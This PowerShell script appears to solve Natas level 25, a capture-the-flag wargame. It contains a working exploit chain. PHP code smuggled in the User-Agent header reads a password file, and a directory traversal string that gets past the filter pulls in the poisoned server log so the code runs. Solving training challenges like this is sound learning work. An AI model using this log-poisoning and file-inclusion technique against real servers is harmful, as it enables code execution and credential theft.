. "../natas_filter.ps1"
. "../getCookieValueFromKey.ps1"

$server = "natas25.natas.labs.overthewire.org"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas25"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}

    #this reads the file, but the file does not contain $__MSG yet
    #$param += "....//....//....//....//....//....//....//....//....//etc/Natas_webpass/natas26"   
#....//....//....//....//etc/Natas_webpass/natas26
#"/var/www/natas/natas25/language"

#1: SEND THIS BY HTTP_USER_AGENT 
#this is in USER_AGENT, none of the user_agent value gets filtered
$phpinjection = ' <?php $fd = fopen("/etc/natas_webpass/natas26", "r");echo fgets($fd);?>' <#fclose($fd);$__MSG= '
$phpinjection += "<<<EOT\n"
$phpinjection += '<p align="justify">{$password}' + "\n"
$phpinjection += "EOT;$__FOOTER= <<<EOT\n"
$phpinjection += '<div align="right"><h6>{$password}</h6><div>' + "\n"
$phpinjection += "EOT;$__GREETING= <<<EOT\n"
$phpinjection += "<h2>{$password}</h2>\n"
$phpinjection += 'EOT; ?>'
#>

write-host `n $phpinjection `n
$headers["User-Agent"] = $phpinjection

#freaks out due to this, saves HTTP_USER_AGENT content into "/var/www/natas/natas25/logs/natas25_" . session_id() . ".log"  
$param = "../de"
$encodedParam = [uri]::EscapeDataString($param)
$url += "?lang=$encodedParam"

"`n----------------------------"
$response = Invoke-WebRequest -Uri $url -Headers $headers -SessionVariable sessVar;
$phpsessid = getCookieValueFromKey -sessVar $sessVar -key "PHPSESSID"
FilterNatasHTML -responseStr $response.Content

write-host "USER_AGENT php injected"



$param = "....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_$phpsessid.log"
$param
$encodedParam = [uri]::EscapeDataString($param)

$url = "http://$server"
$url += "?lang=$encodedParam"

$response = Invoke-WebRequest -Uri $url -Headers $headers -WebSession $sessVar
FilterNatasHTML -responseStr $response.Content

<#

/var/www/natas/natas25/index.php

write something into here: and then?
    $fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() . ".log", "a");

    
        // language/../index.php

#>